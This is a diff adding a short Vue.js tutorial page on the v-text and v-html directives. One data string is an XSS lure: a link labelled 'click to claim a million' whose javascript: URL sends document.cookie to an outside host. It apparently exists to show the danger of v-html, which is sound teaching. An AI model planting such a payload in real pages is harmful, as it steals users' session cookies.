@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>内置指令</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div v-text="str0"></div>
+        <div v-html="str1"></div>
+        <div v-html="str2"></div>
+    </div>
+    
+</body>
+<script type="text/javascript">
+    new Vue({
+        el:'#root',
+        data:{
+            str0:'嗨嗨嗨！',
+            str1:'<h3>你好！</h3>',
+            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击领一百万！！！！</a>'
+        }
+    })
+</script>
+</html>
